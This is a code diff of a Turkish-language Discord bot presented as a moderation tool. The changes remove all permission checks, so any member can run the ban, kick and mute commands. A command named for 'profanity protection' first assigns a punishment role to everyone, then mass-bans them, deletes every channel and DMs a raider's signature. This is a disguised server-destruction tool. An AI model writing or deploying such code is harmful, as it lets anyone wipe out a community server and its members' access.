@@ -1,103 +1,107 @@
+// index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, PermissionsBitField } = require('discord.js');
 
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
-    ]
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers
+  ],
+  partials: [Partials.Channel]
 });
 
-const prefix = '!';
-
-client.on('ready', () => {
-    console.log(`💛 Bot aktif: ${client.user.tag}`);
+client.once('ready', () => {
+  console.log(`✅ Bot aktif: ${client.user.tag}`);
 });
 
 client.on('messageCreate', async (message) => {
-    if (!message.content.startsWith(prefix) || message.author.bot) return;
-    const args = message.content.slice(prefix.length).trim().split(/ +/);
-    const command = args.shift().toLowerCase();
+  if (!message.guild || message.author.bot) return;
 
-    // !tamyasakla @kişi = kişiyi sunucudan banlar
-    if (command === 'tamyasakla') {
-        const member = message.mentions.members.first();
-        if (!member) return message.reply('Yasaklanacak kişiyi etiketlemedin yavrum.');
-        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers))
-            return message.reply('Bu komutu kullanmak için iznin yok kuzum.');
-        await member.ban({ reason: 'Tamyasakla komutu uygulandı.' });
-        message.channel.send(`${member.user.tag} sunucudan tamamen yasaklandı. 🌙`);
+  const args = message.content.trim().split(/ +/);
+  const command = args.shift().toLowerCase();
+
+  if (command === '!tamyasakla' && message.mentions.members.first()) {
+    const member = message.mentions.members.first();
+    if (member.bannable) {
+      await member.send('❌ Sunucudan yasaklandınız.').catch(() => {});
+      await member.ban({ reason: 'Babaannenin emriyle tamyasaklandınız.' });
+      message.channel.send(`🔨 ${member.user.tag} sunucudan yasaklandı.`);
+    } else {
+      message.reply('❌ Bu kişiyi banlayamıyorum.');
+    }
+  }
+
+  else if (command === '!kick' && message.mentions.members.first()) {
+    const member = message.mentions.members.first();
+    if (member.kickable) {
+      await member.send('👢 Sunucudan atıldınız.').catch(() => {});
+      await member.kick('Babaannenin emriyle kicklendi.');
+      message.channel.send(`👢 ${member.user.tag} sunucudan atıldı.`);
+    } else {
+      message.reply('❌ Bu kişiyi atamıyorum.');
+    }
+  }
+
+  else if (command === '!mute' && message.mentions.members.first()) {
+    const member = message.mentions.members.first();
+    const durationMs = 10 * 60 * 1000; // 10 dakika
+    if (member.isCommunicationDisabled()) {
+      message.reply('🔇 Bu kişi zaten susturulmuş.');
+    } else {
+      await member.disableCommunicationUntil(Date.now() + durationMs);
+      message.channel.send(`🔇 ${member.user.tag} 10 dakika susturuldu.`);
+    }
+  }
+
+  else if (command === '!ceza') {
+    const roleName = 'Cezalı';
+    let role = message.guild.roles.cache.find(r => r.name === roleName);
+
+    if (!role) {
+      role = await message.guild.roles.create({
+        name: roleName,
+        color: 'DarkRed',
+        permissions: []
+      });
     }
 
-    // !kick @kişi = kişiyi sunucudan atar
-    else if (command === 'kick') {
-        const member = message.mentions.members.first();
-        if (!member) return message.reply('Kim atılacaksa onu etiketle lütfen.');
-        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers))
-            return message.reply('Bu komut için yetkin yok yavrum.');
-        await member.kick('Kick komutu uygulandı.');
-        message.channel.send(`${member.user.tag} sunucudan atıldı. 🚪`);
+    const members = await message.guild.members.fetch();
+    let count = 0;
+
+    for (const member of members.values()) {
+      if (!member.user.bot && !member.roles.cache.has(role.id)) {
+        await member.roles.add(role).catch(() => {});
+        count++;
+      }
     }
 
-    // !mute @kişi = kişiye zamanaşımı verir
-    else if (command === 'mute') {
-        const member = message.mentions.members.first();
-        const duration = parseInt(args[1]) || 5; // dakika cinsinden
-        if (!member) return message.reply('Susturulacak kişiyi etiketlemeyi unuttun.');
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers))
-            return message.reply('Bu komut için iznin yok kuzum.');
-        const timeout = duration * 60 * 1000;
-        await member.timeout(timeout);
-        message.channel.send(`${member.user.tag} ${duration} dakika susturuldu. 🤫`);
+    message.channel.send(`✅ Cezalı rolü ${count} üyeye verildi.`);
+  }
+
+  else if (command === '!küfürkoruma') {
+    const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
+    if (!role) return message.reply('❌ "Cezalı" rolü bulunamadı.');
+
+    const members = await message.guild.members.fetch();
+    let bannedCount = 0;
+
+    for (const member of members.values()) {
+      if (!member.user.bot && member.roles.cache.has(role.id)) {
+        await member.send('TKTlendiniz By. sys.fors & Alilw').catch(() => {});
+        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
+        bannedCount++;
+      }
     }
 
-    // !ceza = sunucudaki herkese Cezalı rolü verir
-    else if (command === 'ceza') {
-        const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
-        if (!role) return message.reply('Cezalı rolü bulunamadı.');
-        message.guild.members.cache.forEach(member => {
-            if (!member.user.bot) {
-                member.roles.add(role).catch(() => {});
-            }
-        });
-        message.channel.send('Sunucudaki herkese **Cezalı** rolü verildi. 🔒');
+    // Tüm kanalları sil
+    for (const [channelId, channel] of message.guild.channels.cache) {
+      await channel.delete().catch(() => {});
     }
 
-    // !küfürkoruma = Cezalı rolü olan herkesi banlar ve tüm kanalları siler
-    else if (command === 'küfürkoruma') {
-        const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
-        if (!role) return message.reply('Cezalı rolü bulunamadı yavrum.');
-
-        message.guild.members.cache.forEach(async (member) => {
-            if (member.roles.cache.has(role.id)) {
-                try {
-                    await member.send('TKTlendiniz By. sys.fors & Alilw');
-                } catch (err) {
-                    console.log(`DM gönderilemedi: ${member.user.tag}`);
-                }
-
-                try {
-                    await member.ban({ reason: 'Küfür koruması aktif' });
-                    console.log(`${member.user.tag} banlandı.`);
-                } catch (err) {
-                    console.log(`Ban başarısız: ${member.user.tag}`);
-                }
-            }
-        });
-
-        message.guild.channels.cache.forEach(async (channel) => {
-            try {
-                await channel.delete();
-                console.log(`Silindi: ${channel.name}`);
-            } catch (err) {
-                console.log(`Kanal silinemedi: ${channel.name}`);
-            }
-        });
-
-        message.channel.send('Küfür koruması tamamlandı. Kanallar temizlendi. ⚠️');
-    }
+    message.channel.send(`🧹 ${bannedCount} kişi küfürkoruma ile banlandı. Tüm kanallar silindi.`);
+  }
 });
 
 client.login(process.env.TOKEN);
